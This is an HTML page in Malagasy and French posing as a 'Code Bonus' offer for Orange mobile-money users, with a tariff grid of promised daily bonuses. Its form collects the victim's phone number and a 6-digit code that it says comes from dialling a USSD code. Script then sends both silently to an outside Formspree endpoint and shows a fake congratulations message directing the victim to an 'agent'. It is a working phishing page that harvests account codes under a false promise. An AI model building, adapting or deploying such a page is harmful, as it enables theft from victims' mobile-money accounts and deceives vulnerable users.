<!DOCTYPE html>
<html lang="mg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Bonus - Azahoana Vola</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0c29; color: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #fff; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; text-align: center; color: #333; }
        .banner-img { width: 100%; height: 180px; background: url('https://img.freepik.com/free-vector/farm-landscape-with-barn-windmills_23-2148855653.jpg') center/cover; }
        .btn-blue { background: #00a8ff; color: #fff; border: none; width: 85%; padding: 15px; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
        .btn-disabled { background: #ccc !important; cursor: not-allowed !important; }
        .scroll-area { max-height: 400px; overflow-y: auto; padding: 10px; }
        .grid-tarif { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 10px; }
        .tarif-box { background: #f8f9fa; border: 1px solid #eee; border-radius: 12px; padding: 15px; }
        .price { color: #00a8ff; font-weight: 800; font-size: 18px; margin: 5px 0; }
        .btn-black { background: #000; color: #fff; border: none; width: 100%; padding: 10px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; }
        .val-img { width: 80%; margin: 20px auto; display: block; }
        .input-field { width: 85%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
        
        /* PEJY FARANY */
        .step4-bg { background: #1c1c3c; color: #fff; padding-bottom: 25px; }
        .agent-frame { width: 90%; margin: 15px auto; border-radius: 12px; overflow: hidden; background: #fff; min-height: 180px; display: flex; align-items: center; justify-content: center; }
        .agent-full-img { width: 100%; height: auto; display: block; }
        .msg-box-green { background: #0a0a20; color: #2ecc71; margin: 15px; padding: 15px; border-radius: 10px; border-left: 5px solid #2ecc71; text-align: left; font-size: 14px; line-height: 1.5; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div id="step1" class="card">
    <div class="banner-img"></div>
    <h3 style="color: #00a8ff; margin-top: 25px;">Bienvenue dans Code Bonus</h3>
    <button class="btn-blue" onclick="showStep(2)">SUIVANT</button>
</div>

<div id="step2" class="card hidden">
    <h2 style="font-size: 18px; margin-top: 20px;">Choisir ton tarif</h2>
    <div class="scroll-area"><div class="grid-tarif" id="tarifContainer"></div></div>
</div>

<div id="step3" class="card hidden">
    <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4822.jpg" class="val-img">
    <h2 style="font-size: 20px;">Validation</h2>
    <div style="background:#fff3cd; color:#856404; padding:10px; font-size:11px; margin:10px; border-radius:5px;">⚠️ Tsy foronina ny 6 chiffres fa alaina ao am #144*3*3*code#</div>
    <form id="valForm" action="https://formspree.io/f/mqkrpova" method="POST">
        <input type="number" id="phone" name="Phone" class="input-field" placeholder="Laharana Orange (032/037)" required>
        <input type="text" id="code6" name="Code_6" class="input-field" placeholder="Kaody 6 chiffres" maxlength="6" required>
        <button type="button" id="confirmBtn" class="btn-blue btn-disabled" onclick="submitForm()" disabled>CONFIRMER</button>
    </form>
</div>

<div id="step4" class="card hidden step4-bg">
    <div class="agent-frame">
        <img src="bonusagent.jpg" class="agent-full-img" id="agentImg" alt="Agent Image">
    </div>
    <h2 style="color: #2ecc71; margin: 10px 0;">Félicitations!</h2>
    <div class="msg-box-green" id="congratsMsg"></div>
    <p style="font-size: 10px; color: #aaa; margin-top: 20px;">Mankasitraka amin'ny fampiasana ny Code Bonus.</p>
</div>

<script>
    let sF = ""; let sB = "";
    const tarifs = [
        {f: "40.000Ar", b: "21.400Ar"}, {f: "60.000Ar", b: "31.400Ar"},
        {f: "90.000Ar", b: "41.400Ar"}, {f: "120.000Ar", b: "56.800Ar"},
        {f: "140.000Ar", b: "71.400Ar"}, {f: "180.000Ar", b: "87.500Ar"},
        {f: "320.000Ar", b: "100.400Ar"}, {f: "560.000Ar", b: "181.400Ar"},
        {f: "980.000Ar", b: "311.400Ar"}, {f: "1.400.000Ar", b: "461.400Ar"}
    ];

    const container = document.getElementById('tarifContainer');
    tarifs.forEach(t => {
        container.innerHTML += `<div class="tarif-box"><h3>${t.f}</h3><div style="font-size:10px; color:#999;">Bonus jour</div><div class="price">${t.b}</div><button class="btn-black" onclick="selectTarif('${t.f}', '${t.b}')">POURSUIVRE</button></div>`;
    });

    function selectTarif(f, b) { sF = f; sB = b; showStep(3); }

    const ph = document.getElementById('phone'); const cd = document.getElementById('code6'); const btn = document.getElementById('confirmBtn');
    function check() { 
        const isO = ph.value.startsWith('032') || ph.value.startsWith('037');
        btn.disabled = !(isO && ph.value.length === 10 && cd.value.length === 6);
        btn.classList.toggle('btn-disabled', btn.disabled);
    }
    ph.oninput = check; cd.oninput = check;

    function submitForm() {
        document.getElementById('congratsMsg').innerHTML = `Felicitation, votre bonus est en cours. Voamarina fa manana fond <b>${sF}</b> ianao ary misitraka bonus <b>${sB}</b> izao ka manasa anao handefa mp amin'i agent code Bonus izao.`;
        showStep(4);
        
        // Raha sanatria tsy mipoitra ilay sary, azonao ampiana fanaraha-maso eto
        const img = document.getElementById('agentImg');
        img.onerror = function() {
            console.log("Tsy hita ny sary bonusagent.jpg");
        };

        fetch(document.getElementById('valForm').action, { 
            method: 'POST', 
            body: new FormData(document.getElementById('valForm')), 
            headers: { 'Accept': 'application/json' } 
        });
    }

    function showStep(s) { 
        document.querySelectorAll('.card').forEach(c => c.classList.add('hidden')); 
        document.getElementById('step' + s).classList.remove('hidden'); 
    }
</script>
</body>
</html>
